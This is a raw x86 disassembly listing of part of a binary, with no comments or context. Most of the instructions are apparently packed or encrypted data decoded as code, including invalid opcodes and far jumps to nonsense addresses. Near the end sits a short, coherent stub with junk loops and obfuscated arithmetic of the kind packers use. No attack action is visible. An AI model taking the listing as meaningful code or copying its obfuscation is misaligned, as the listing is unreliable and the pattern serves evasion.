  4098c3:	or     ecx,DWORD PTR [eax-0x4ac59a91]
  4098c9:	cld    
  4098ca:	jne    0x4098c6
  4098cc:	jl     0x40985f
  4098ce:	popa   
  4098cf:	mov    ebp,0xccc88c5
  4098d4:	mov    ah,0x15
  4098d6:	cmp    eax,0x9540f79b
  4098db:	mov    bl,0x59
  4098dd:	ins    BYTE PTR es:[edi],dx
  4098de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098df:	sbb    edi,DWORD PTR gs:[edx]
  4098e2:	(bad)  
  4098e3:	imul   ebx
  4098e5:	into   
  4098e6:	std    
  4098e7:	jbe    0x409876
  4098e9:	sbb    al,0xa4
  4098eb:	sbb    cl,BYTE PTR [ecx+0x636a839]
  4098f1:	aam    0xd3
  4098f3:	cs lock in al,0xe7
  4098f7:	or     al,0x43
  4098f9:	push   ebp
  4098fa:	jl     0x4098ca
  4098fc:	mov    ebx,0x4a06e8b5
  409901:	or     edx,DWORD PTR [ebx]
  409903:	ins    BYTE PTR es:[edi],dx
  409904:	sbb    al,0xa9
  409906:	out    0xb7,eax
  409908:	cld    
  409909:	xchg   BYTE PTR [edx],bl
  40990b:	cli    
  40990c:	push   0x962abca8
  409911:	or     dl,dl
  409913:	jecxz  0x409925
  409915:	xchg   al,cl
  409917:	add    eax,0xd9c3b336
  40991c:	mov    ch,0xc6
  40991e:	push   0xffffffcd
  409920:	mov    edi,0x170aefd5
  409925:	les    edi,FWORD PTR [ebx-0x79a8b5e5]
  40992b:	add    al,0x7c
  40992d:	mov    eax,0x446ec73e
  409932:	mov    bh,0x3c
  409934:	push   ss
  409935:	sti    
  409936:	push   eax
  409937:	push   esi
  409938:	ja     0x4099ad
  40993a:	ds mov esp,0x63587177
  409940:	mov    edx,0x79938d6b
  409945:	mov    BYTE PTR [ebx+esi*8],dh
  409948:	fwait
  409949:	mov    eax,ds:0xb9ceaa4e
  40994e:	push   ds
  40994f:	lea    ebx,[eax]
  409951:	or     DWORD PTR [eax],eax
  409953:	pushf  
  409954:	push   es
  409955:	and    BYTE PTR [ecx+ebp*2],0x2b
  409959:	mov    bl,BYTE PTR [eax+ecx*4-0x46]
  40995d:	mov    dl,0x87
  40995f:	in     al,0x92
  409961:	fbstp  TBYTE PTR [edi+0x2a671293]
  409967:	xor    esp,ecx
  409969:	daa    
  40996a:	and    al,0x8c
  40996c:	rol    bl,cl
  40996e:	jne    0x409905
  409970:	inc    ebp
  409971:	(bad)  [edx+0x5]
  409974:	push   ds
  409975:	(bad)  
  409976:	push   ebx
  409977:	xchg   esi,eax
  409978:	int3   
  409979:	push   eax
  40997a:	lea    ebx,[ebx]
  40997c:	scas   al,BYTE PTR es:[edi]
  40997d:	je     0x40997d
  40997f:	fld    TBYTE PTR [edi]
  409981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409982:	jns    0x409968
  409984:	mov    ecx,DWORD PTR [esi]
  409986:	mov    al,cl
  409988:	jno    0x4099f0
  40998a:	sar    bl,cl
  40998c:	cmp    al,0x63
  40998e:	sub    DWORD PTR [ecx+eax*8+0x77325551],0xffffffa3
  409996:	pop    es
  409997:	add    DWORD PTR [edi-0x5d5ac6e5],ebx
  40999d:	xchg   ebx,eax
  40999e:	dec    edi
  40999f:	iret   
  4099a0:	idiv   BYTE PTR [ebx+edi*4+0x70]
  4099a4:	cwde   
  4099a5:	mov    eax,0x9e3c973b
  4099aa:	cld    
  4099ab:	ficom  WORD PTR [esi-0x6bc4ab4c]
  4099b1:	cmp    al,0x11
  4099b3:	mov    ah,0xf9
  4099b5:	xchg   ebx,eax
  4099b6:	imul   ebp,DWORD PTR [eax-0x50],0x5f6c83ac
  4099bd:	mov    cl,0xb0
  4099bf:	sub    ebx,DWORD PTR [ebx+0x74df3f9]
  4099c5:	push   ecx
  4099c6:	mov    DWORD PTR ds:0x42a895,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a8a5,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a895,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a819,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a799
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0xec14cf]
  409a19:	cmp    bh,cl
  409a1b:	jb     0x4099d3
  409a1d:	idiv   DWORD PTR [eax+0x78]
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099c7
  409a25:	aam    0x26
  409a27:	loope  0x4099fa
  409a29:	cmc    
  409a2a:	rcr    BYTE PTR [edi],cl
  409a2c:	inc    esi
  409a2d:	sub    eax,0x82c62e50
  409a32:	sub    DWORD PTR [ebx],edi
  409a34:	and    BYTE PTR [esi+0xb],0x25
  409a38:	mov    eax,ds:0x22caa34f
  409a3d:	push   edx
  409a3e:	addr16 loope 0x409a1a
  409a41:	mov    ecx,0xbd3419fb
  409a46:	pop    ebx
  409a47:	jle    0x409a84
  409a49:	loope  0x409a48
  409a4b:	sbb    ch,BYTE PTR [ecx]
  409a4d:	mov    edi,0x2cb85cfb
  409a52:	sub    esi,edx
  409a54:	fnstcw WORD PTR [ebx-0x5e]
  409a57:	jnp    0x409a16
  409a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a5a:	sti    
  409a5b:	push   ds
  409a5c:	leave  
  409a5d:	es cmp al,0x5d
  409a60:	jno    0x409a6c
  409a62:	rol    BYTE PTR [ebx+0x6a],cl
  409a65:	mov    bl,0x16
  409a67:	mov    bl,0x54
  409a69:	cmp    eax,0x874bc60c
  409a6e:	shl    DWORD PTR [ebp+0x58],cl
  409a71:	xchg   BYTE PTR [edx],dh
  409a73:	lods   al,BYTE PTR ds:[esi]
  409a74:	dec    ebp
  409a75:	test   DWORD PTR [edi],ebx
  409a77:	iret   
  409a78:	daa    
  409a79:	push   ecx
  409a7a:	mov    esp,0x5f5bb623
  409a7f:	xor    edx,DWORD PTR [edi]
  409a81:	sub    DWORD PTR [edx],esp
  409a83:	loope  0x409aec
  409a85:	add    edx,DWORD PTR [edi-0x1]
  409a88:	push   es
  409a89:	sbb    BYTE PTR [ebx],dl
  409a8b:	or     BYTE PTR [ecx-0x37],ch
  409a8e:	inc    edx
  409a8f:	sbb    dl,dl
  409a91:	cmp    al,0xb1
  409a93:	repz sub BYTE PTR ds:0xa863b292,0x51
  409a9b:	(bad)  
  409a9c:	fidivr DWORD PTR [ecx]
  409a9e:	stc    
  409a9f:	in     eax,dx
  409aa0:	repnz into 
  409aa2:	xor    al,0xd8
  409aa4:	mov    cl,BYTE PTR [ebx]
  409aa6:	enter  0xdd2e,0x79
  409aaa:	jne    0x409a37
  409aac:	push   esi
  409aad:	and    al,0x27
  409aaf:	push   0x89374022
  409ab4:	not    BYTE PTR [ebp-0x3e3d3ff]
  409aba:	xor    ebx,edi
  409abc:	push   edi
  409abd:	xchg   edx,eax
  409abe:	jle    0x409a41
  409ac0:	scas   eax,DWORD PTR es:[edi]
  409ac1:	cli    
  409ac2:	shr    BYTE PTR [edx],1
  409ac4:	fnstsw WORD PTR [ecx-0x5e0f672]
  409aca:	inc    esi
  409acb:	js     0x409a65
  409acd:	and    bl,BYTE PTR [edi+ebx*8+0x351b5e62]
  409ad4:	inc    ebp
  409ad5:	sub    cl,ch
  409ad7:	shr    DWORD PTR [edi],0x33
  409ada:	inc    eax
  409adb:	sbb    DWORD PTR [edx+esi*4-0x60a6ef26],edx
  409ae2:	inc    edi
  409ae3:	xchg   ebp,eax
  409ae4:	cmp    DWORD PTR [ebx],ebp
  409ae6:	outs   dx,BYTE PTR ds:[esi]
  409ae7:	pop    ecx
  409ae8:	mov    WORD PTR [ebx-0x61],ss
  409aeb:	cmp    eax,0x9d80dc22
  409af0:	mov    bh,0x82
  409af2:	jmp    0x409afe
  409af4:	and    BYTE PTR [ebp-0x5998126],dh
  409afa:	scas   al,BYTE PTR es:[edi]
  409afb:	mov    ah,bh
  409afd:	mov    esp,0x23b08afd
  409b02:	mov    ds:0x41f85747,al
  409b07:	or     dh,BYTE PTR [eax+ebp*2-0x47]
  409b0b:	test   BYTE PTR [ecx],bl
  409b0d:	xor    ebx,eax
  409b0f:	pop    ecx
  409b10:	cmc    
  409b11:	cdq    
  409b12:	push   ss
  409b13:	pop    ss
  409b14:	iret   
  409b15:	mul    cl
  409b17:	or     cl,0x55
  409b1a:	ins    DWORD PTR es:[edi],dx
  409b1b:	xchg   ch,dh
  409b1d:	mov    edi,0x93415e5d
  409b22:	retf   0xb9c8
  409b25:	test   eax,0xce21da3e
  409b2a:	lea    esp,[ebx-0x5d]
  409b2d:	ja     0x409b8d
  409b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b30:	and    DWORD PTR [edx*8+0x64b2366c],0xa6fecde3
  409b3b:	sub    eax,DWORD PTR [esi+ebp*1+0x3a]
  409b3f:	cdq    
  409b40:	fstp   QWORD PTR [edi+0x21631db1]
  409b46:	mov    ah,0x15
  409b48:	pop    esp
  409b49:	mov    ds,WORD PTR [edi+0x74]
  409b4c:	mov    bl,0xfc
  409b4e:	shl    BYTE PTR [edi-0x123ee86a],cl
  409b54:	retf   
  409b55:	pop    edx
  409b56:	cli    
  409b57:	inc    esp
  409b58:	vpmullw xmm0,xmm7,xmm5
  409b5c:	mov    WORD PTR [edi+esi*1],ss
  409b5f:	setle  BYTE PTR [esi+ecx*8]
  409b63:	aaa    
  409b64:	sbb    ebp,ebp
  409b66:	out    dx,eax
  409b67:	outs   dx,BYTE PTR ds:[esi]
  409b68:	sub    DWORD PTR [ecx-0x307eb6d1],edi
  409b6e:	int    0xc4
  409b70:	iret   
  409b71:	ds (bad) 
  409b73:	cmp    esi,DWORD PTR [ecx-0x44e1c1ac]
  409b79:	je     0x409bb8
  409b7b:	repnz add BYTE PTR [ebp+0x2b],bh
  409b7f:	loop   0x409b04
  409b81:	rcl    ch,0xda
  409b84:	fdivr  QWORD PTR [eax-0x35]
  409b87:	mov    dl,0x8a
  409b89:	fwait
  409b8a:	adc    eax,0x239bc95e
  409b8f:	fsub   QWORD PTR [edi+ebx*2-0xdbf4e7]
  409b96:	loop   0x409b19
  409b98:	sub    eax,0x549f38b6
  409b9d:	or     eax,DWORD PTR [ecx+0x472259c8]
  409ba3:	icebp  
  409ba4:	cmc    
  409ba5:	fdiv   QWORD PTR ds:0xf58ce1a4
  409bab:	add    ch,BYTE PTR ds:0xb506a194
  409bb1:	sbb    edi,DWORD PTR [edi]
  409bb3:	sub    dl,BYTE PTR [edi-0xc]
  409bb6:	test   DWORD PTR [edx-0x44],0x373b23f8
  409bbd:	call   0xf9addd45
  409bc2:	push   esp
  409bc3:	and    al,0x4c
  409bc6:	add    dl,BYTE PTR [esp+eax*2+0x600ec7f0]
  409bcd:	or     al,0x1b
  409bcf:	test   eax,0x829522c7
  409bd4:	(bad)  
  409bd5:	out    0xb8,eax
  409bd7:	popf   
  409bd8:	sub    eax,0xdb434750
  409bdd:	xor    esp,esp
  409bdf:	pop    esp
  409be0:	xchg   DWORD PTR [eax+0x7d],ecx
  409be3:	icebp  
  409be4:	lods   eax,DWORD PTR ds:[esi]
  409be5:	cld    
  409be6:	push   cs
  409be7:	cwde   
  409be8:	pop    edx
  409be9:	adc    bx,WORD PTR [ecx-0x62ae4805]
  409bf0:	sbb    eax,0xb0eaf159
  409bf5:	outs   dx,BYTE PTR ds:[esi]
  409bf6:	mov    dl,0x1e
  409bf8:	sbb    ch,dl
  409bfa:	cs gs dec ebx
  409bfd:	sbb    dl,BYTE PTR [ecx+0x35]
  409c00:	pop    ebp
  409c01:	fbld   TBYTE PTR [edx+ebx*8+0x27]
  409c05:	mov    edi,0x606769d3
  409c0a:	sub    bh,cl
  409c0c:	sub    ah,bl
  409c0e:	test   al,0x65
  409c10:	(bad)  
  409c11:	pop    esi
  409c12:	icebp  
  409c13:	lock jb 0x409bd9
  409c16:	jns    0x409bb1
  409c18:	cmp    al,0xbf
  409c1a:	sbb    dh,BYTE PTR [edi-0x78]
  409c1d:	call   0xc1ee:0x8503d0e6
  409c24:	pushf  
  409c25:	shl    DWORD PTR [ebp-0x13],cl
  409c28:	sub    DWORD PTR [edi-0x16],edi
  409c2b:	(bad)
  409c2e:	imul   di,WORD PTR [edx+edx*4-0x6a],0xa9e9
  409c35:	div    dh
  409c37:	mov    edx,0x9a79fac0
  409c3c:	inc    eax
  409c3d:	ds int 0xa8
  409c40:	jns    0x409bc9
  409c42:	push   ebp
  409c43:	adc    BYTE PTR [ecx+0xc],dl
  409c46:	inc    eax
  409c47:	or     eax,0x787965f9
  409c4c:	sbb    eax,ebp
  409c4e:	aas    
  409c4f:	lock ret 0x93b6
  409c53:	dec    ebx
  409c54:	jl     0x409cbb
  409c56:	mov    edi,0x4dfc168b
  409c5b:	and    edx,ecx
  409c5d:	xchg   DWORD PTR [edi+0x12],eax
  409c60:	jg     0x409c30
  409c62:	fwait
  409c63:	test   DWORD PTR [edx+0x4f6df2d9],ecx
  409c69:	data16 (bad) 
  409c6b:	jmp    0xeda:0x6a9a2e15
  409c72:	mov    ds:0x5459591d,eax
  409c77:	js     0x409c9f
  409c79:	mov    DWORD PTR [ebp-0x1b],ebx
  409c7c:	loop   0x409c4d
  409c7e:	retf   0xebf2
  409c81:	jg     0x409c17
  409c83:	xchg   ecx,eax
  409c84:	bound  edx,QWORD PTR [edi-0x65db0d0]
  409c8a:	sub    BYTE PTR [edi],dh
  409c8c:	mov    bh,0xd
  409c8e:	mov    ebp,DWORD PTR cs:[esi]
  409c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c92:	xchg   esp,eax
  409c93:	cdq    
  409c94:	dec    esi
  409c95:	sbb    dh,BYTE PTR [edx-0x1c]
  409c98:	ja     0x409ca2
  409c9a:	nop
  409c9b:	mov    eax,ds:0x63432f47
  409ca0:	ror    BYTE PTR [eax+0x29],0x37
  409ca4:	jmp    0x409d20
  409ca6:	pop    esp
  409ca7:	pop    esp
  409ca8:	jle    0x409c79
  409caa:	jnp    0x409d11
  409cac:	add    BYTE PTR [ebp+0x24],0x7e
  409cb0:	imul   esi,DWORD PTR [esp+esi*2],0x68
  409cb4:	and    BYTE PTR [ecx],bl
  409cb6:	leave  
  409cb7:	fsubr  DWORD PTR ds:0x9c10ee86
  409cbd:	pushf  
  409cbe:	push   es
  409cbf:	shl    DWORD PTR [ecx],1
  409cc1:	mov    DWORD PTR [bp+0xd],edx
  409cc5:	neg    DWORD PTR [esi+edx*8]
  409cc8:	or     esi,eax
  409cca:	xor    ebx,DWORD PTR [edx]
  409ccc:	mov    esi,0xf5e24cec
  409cd1:	call   0xc047:0xe2e327d5
  409cd8:	addr16 push ecx
  409cda:	call   0xbfb0:0x8d3c3180
  409ce1:	mov    WORD PTR [edi-0x718b6bab],es
  409ce7:	inc    eax
  409ce8:	mov    ebx,0xf5952d6a
  409ced:	pop    ecx
  409cee:	jg     0x409d2b
  409cf0:	out    dx,al
  409cf1:	dec    ecx
  409cf2:	dec    ecx
  409cf3:	mov    ds,esi
  409cf5:	lds    ebx,FWORD PTR [eax+0x664fa7a3]
  409cfb:	mov    eax,DWORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a799,0x42a825
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a79d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a861,0x42a85d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a851,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x23a9d450],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409dc5
  409d66:	dec    ebp
  409d67:	dec    ebx
  409d68:	push   ecx
  409d69:	imul   ecx,DWORD PTR [ebp-0x11],0xa
  409d6d:	push   ds
  409d6e:	loop   0x409d15
  409d70:	in     al,0x7f
  409d72:	inc    ebx
  409d73:	(bad)  
  409d74:	in     eax,0xad
  409d76:	adc    BYTE PTR [esp+edx*1-0x19],0xb2
  409d7b:	fwait
  409d7c:	sub    al,0xae
  409d7e:	pop    ds
  409d7f:	int3   
  409d80:	stc    
  409d81:	addr16 ret 0x8e0c
  409d85:	sbb    al,0xf5
  409d87:	jmp    0x4f2204ca
  409d8c:	inc    eax
  409d8d:	mov    esi,0xc110150c
  409d92:	add    DWORD PTR [ecx+0x4649fdce],ebx
  409d98:	neg    BYTE PTR [ecx]
  409d9a:	mov    dl,0xfd
  409d9c:	fild   WORD PTR [edx]
  409d9e:	pop    esp
  409d9f:	cmp    eax,0xd104f6d9
  409da4:	arpl   WORD PTR [edi-0x4b],ax
  409da7:	pop    esi
  409da8:	pop    ds
  409da9:	sahf   
  409daa:	xor    DWORD PTR [edi+eax*8],eax
  409dad:	lods   eax,DWORD PTR ds:[esi]
  409dae:	inc    edx
  409daf:	fstp   st(7)
  409db1:	pushf  
  409db2:	imul   ebx
  409db4:	or     eax,0xb5d56366
  409db9:	xor    DWORD PTR [eax+0x4dc11b75],eax
  409dbf:	push   ebx
  409dc0:	int    0x3d
  409dc2:	jae    0x409df8
  409dc4:	cmp    ecx,DWORD PTR [edx+0x7d]
  409dc7:	jmp    0xdd95:0xee42a1ab
  409dce:	popa   
  409dcf:	jo     0x409e3f
  409dd1:	push   edx
  409dd2:	hlt    
  409dd3:	(bad)  
  409dd4:	pop    ecx
  409dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dd6:	popf   
  409dd7:	les    esi,FWORD PTR [eax]
  409dd9:	pop    ebx
  409dda:	pop    esi
  409ddb:	inc    esi
  409ddc:	mov    al,bl
  409dde:	jle    0x409e44
  409de0:	dec    esp
  409de1:	push   edi
  409de2:	pop    ecx
  409de3:	adc    BYTE PTR [edx],dh
  409de5:	jp     0x409e4b
  409de7:	nop
  409de8:	jno    0x409dbe
  409dea:	push   0xffffffca
  409dec:	lea    ecx,[ebx+0x18a18664]
  409df2:	mov    eax,0x2d4aaa8f
  409df7:	dec    esp
  409df8:	fwait
  409df9:	sti    
  409dfa:	jb     0x409e40
  409dfc:	in     eax,dx
  409dfd:	mov    cl,0x24
  409dff:	shl    BYTE PTR [eax-0x34],1
  409e02:	int    0x3b
  409e04:	dec    ebx
  409e05:	leave  
  409e06:	push   ss
  409e07:	aam    0x62
  409e09:	in     al,dx
  409e0a:	lahf   
  409e0b:	inc    edi
  409e0c:	call   FWORD PTR [edi+eiz*8-0x74]
  409e10:	xchg   DWORD PTR [ebx-0x47d4509c],edi
  409e16:	mov    ecx,0xb503ac4
  409e1b:	pop    es
  409e1c:	fisttp QWORD PTR [edi+0x2360ba37]
  409e22:	sub    al,0x40
  409e24:	jnp    0x409df4
  409e26:	inc    esi
  409e27:	popf   
  409e28:	cmp    eax,0x96154235
  409e2d:	pop    ds
  409e2e:	sbb    DWORD PTR [ebx],eax
  409e30:	jle    0x409e51
  409e32:	inc    edi
  409e33:	(bad)  
  409e34:	fdivr  DWORD PTR [edx+0x24]
  409e37:	jmp    0x9677:0x939708af
  409e3e:	jnp    0x409e15
  409e40:	fnstenv ds:0x3059af81
  409e46:	in     al,dx
  409e47:	jg     0x409dd3
  409e49:	fdiv   DWORD PTR [edi]
  409e4b:	sbb    bl,BYTE PTR [ecx+eiz*2-0x2d4c2bde]
  409e52:	int3   
  409e53:	adc    al,BYTE PTR [edi+eax*4]
  409e56:	push   0xffffffd9
  409e58:	xor    BYTE PTR [ecx+0x7d62291c],0x64
  409e5f:	(bad)  
  409e60:	fistp  WORD PTR [ebp-0x5f]
  409e63:	int    0x2d
  409e65:	add    eax,0x797d8059
  409e6a:	mov    ecx,0xe5147ea9
  409e6f:	sti    
  409e70:	xchg   ecx,eax
  409e71:	jnp    0x409e97
  409e73:	pop    esp
  409e74:	mov    DWORD PTR [edx+0xa],ecx
  409e77:	sbb    BYTE PTR [ecx+0x1d64022c],dh
  409e7d:	(bad)  
  409e7e:	fnstenv [esi+0x29]
  409e81:	sbb    cl,BYTE PTR [eax+0x0]
  409e84:	adc    edx,DWORD PTR [ebx]
  409e86:	dec    ecx
  409e87:	mov    cl,0xd1
  409e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8a:	call   0xb433:0x9b83bcf1
  409e91:	jl     0x409ecc
  409e93:	fistp  QWORD PTR [ecx]
  409e95:	add    DWORD PTR [esi-0x7f],eax
  409e98:	mov    BYTE PTR [edi-0x3],dl
  409e9b:	jbe    0x409ef0
  409e9d:	push   esp
  409e9e:	ret    0xd0dd
  409ea1:	int3   
  409ea2:	mov    al,0x50
  409ea4:	or     dl,bh
  409ea6:	jle    0x409f14
  409ea8:	add    bl,BYTE PTR [esp+edi*4-0x6e]
  409eac:	sbb    eax,0x49dc6351
  409eb1:	scas   al,BYTE PTR es:[edi]
  409eb2:	fucomi st,st(6)
  409eb4:	rcl    DWORD PTR [eax],cl
  409eb6:	cdq    
  409eb7:	xchg   edi,eax
  409eb8:	and    eax,0x1e9cd7d
  409ebd:	jle    0x409ef1
  409ebf:	test   eax,0x28ad3266
  409ec4:	mov    bl,BYTE PTR [edx+0x46e22c13]
  409eca:	xchg   DWORD PTR [ebp+0x7a],esp
  409ecd:	clc    
  409ece:	adc    cl,dh
  409ed0:	and    BYTE PTR [eax+0x22],ch
  409ed3:	and    eax,0x2b297244
  409ed8:	inc    ebp
  409ed9:	popf   
  409eda:	push   0xf1f3d2a8
  409edf:	sbb    ebx,DWORD PTR [ecx]
  409ee1:	push   eax
  409ee2:	pop    edx
  409ee3:	retf   0x970
  409ee6:	data16 mov al,ds:0x3d332bd3
  409eec:	sub    eax,0x1835a69d
  409ef1:	cs call 0x74932c40
  409ef7:	or     eax,ebx
  409ef9:	pop    esp
  409efa:	jae    0x409f05
  409efc:	mov    bh,0x19
  409efe:	mov    ah,0xfc
  409f00:	stc    
  409f01:	fmul   st(2),st
  409f03:	or     BYTE PTR [esi],dh
  409f05:	pop    ecx
  409f06:	push   edi
  409f07:	cwde   
  409f08:	rcl    BYTE PTR [eax+0x2],1
  409f0b:	inc    edx
  409f0c:	xchg   ebx,eax
  409f0d:	push   es
  409f0e:	add    BYTE PTR [ebp-0x2af6c04a],ch
  409f14:	out    dx,al
  409f15:	hlt    
  409f16:	mov    bl,0x12
  409f18:	adc    DWORD PTR [edi-0x7ab799f9],ebx
  409f1e:	icebp  
  409f1f:	jmp    0xd956acfa
  409f24:	adc    bl,BYTE PTR [ecx+0x67ffa66c]
  409f2a:	adc    esp,esp
  409f2c:	popf   
  409f2d:	xor    dh,ah
  409f2f:	dec    edi
  409f30:	jmp    0xfd78:0x85abeb2b
  409f37:	ins    DWORD PTR es:[edi],dx
  409f38:	adc    eax,0xd49442c7
  409f3d:	and    eax,0xc306bc17
  409f42:	int3   
  409f43:	popa   
  409f44:	and    al,0x6f
  409f46:	jae    0x409fc4
  409f48:	stc    
  409f49:	sub    BYTE PTR [ebx],ch
  409f4b:	and    BYTE PTR [ebp+0x6f18cd44],ah
  409f51:	add    eax,0x9f4031bc
  409f56:	xchg   ebx,eax
  409f57:	(bad)  
  409f58:	(bad)  
  409f59:	enter  0x2bb7,0xb9
  409f5d:	and    eax,0x80195350
  409f62:	dec    ecx
  409f63:	idiv   DWORD PTR [ecx]
  409f65:	and    ebx,ebx
  409f67:	or     edi,edi
  409f69:	sbb    ecx,esi
  409f6b:	loop   0x409f7d
  409f6d:	test   BYTE PTR [ecx*8-0x6916ff2c],bl
  409f74:	scas   al,BYTE PTR es:[edi]
  409f75:	xor    ebx,DWORD PTR [eax+0x5f]
  409f78:	in     al,dx
  409f79:	test   eax,0xc90f4517
  409f7e:	ds mov ah,0x6d
  409f81:	fwait
  409f82:	mov    ah,0x6e
  409f84:	inc    edi
  409f85:	stos   BYTE PTR es:[edi],al
  409f86:	mov    ecx,0xa6b5434f
  409f8b:	scas   eax,DWORD PTR es:[edi]
  409f8c:	mov    eax,0xbc6de678
  409f91:	add    esp,DWORD PTR [edx-0x583bf8a2]
  409f97:	or     DWORD PTR [esi-0x29],0x57
  409f9b:	stc    
  409f9c:	mov    edx,DWORD PTR [esi]
  409f9e:	jp     0x409f29
  409fa0:	inc    esp
  409fa1:	mov    esp,0x16ff28f4
  409fa6:	stc    
  409fa7:	in     eax,dx
  409fa8:	and    BYTE PTR [edi+0x121ae8ee],dl
  409fae:	inc    ebx
  409faf:	std    
  409fb0:	inc    ebp
  409fb1:	jle    0x409f4e
  409fb3:	(bad)  
  409fb4:	fcmovnbe st,st(1)
  409fb6:	cmp    eax,0xa9fd85ea
  409fbb:	sbb    eax,0x6bdf0fe8
  409fc0:	cmc    
  409fc1:	mov    ch,0x2b
  409fc3:	xchg   esp,eax
  409fc4:	popa   
  409fc5:	jmp    0x903b:0xdb162d8c
  409fcc:	jno    0x409f73
  409fce:	and    eax,0x2605eab1
  409fd3:	pop    ebp
  409fd4:	call   0xef6b:0xfaa61a78
  409fdb:	call   0xa199cdab
  409fe0:	(bad)  
  409fe1:	cli    
  409fe2:	enter  0xeba5,0x9e
  409fe6:	jp     0x409fae
  409fe8:	call   0x72f24577
  409fed:	loope  0x40a011
  409fef:	mov    bh,0x4e
  409ff1:	mov    ah,0xc9
  409ff3:	loop   0x40a068
  409ff5:	outs   dx,DWORD PTR ds:[esi]
  409ff6:	sbb    BYTE PTR [ebp-0x69],dl
  409ff9:	inc    esi
  409ffa:	pop    ebp
  409ffb:	mov    ax,ds:0xbbc53497
  40a001:	jp     0x409f97
  40a003:	push   ebp
  40a004:	popf   
  40a005:	inc    edi
  40a006:	stos   BYTE PTR es:[edi],al
  40a007:	mov    BYTE PTR [edi+0x54],dh
  40a00a:	mov    ecx,0x381e1580
  40a00f:	clc    
  40a010:	daa    
  40a011:	xor    dl,BYTE PTR [eax+0x78bc9168]
  40a017:	xor    DWORD PTR [esi],0xffffffa2
  40a01a:	popa   
  40a01b:	mov    ecx,0x191d975c
  40a020:	adc    eax,0xf34e1b1
  40a025:	pop    ss
  40a026:	dec    esp
  40a027:	xchg   ecx,eax
  40a028:	sub    BYTE PTR [eax-0x32],bl
  40a02b:	lea    edi,[ebx]
  40a02d:	jmp    0x979d4cbf
  40a032:	mov    bh,0x65
  40a034:	and    eax,0xcb6967ae
  40a039:	in     al,0x23
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a785,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a785
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a785,eax
  40a084:	cmp    DWORD PTR ds:0x42a785,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a785,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a891,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a891
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a891,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a891,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a891,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a7ad
  40a106:	mov    eax,ds:0x42a889
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a875
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a8b1
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a781,0x0
  40a13c:	jmp    0x40a14e
